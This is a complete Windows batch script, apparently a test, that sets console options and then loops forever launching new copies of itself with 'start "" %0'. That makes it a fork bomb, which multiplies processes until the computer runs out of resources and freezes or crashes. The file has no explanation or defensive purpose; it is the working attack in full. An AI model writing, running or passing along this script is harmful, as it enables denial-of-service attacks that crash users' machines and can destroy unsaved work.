@CHCP 65001 >nul
::UTF-8
@echo off
title Teste
mode 50, 20
color 02

:s
start "" %0
goto:s


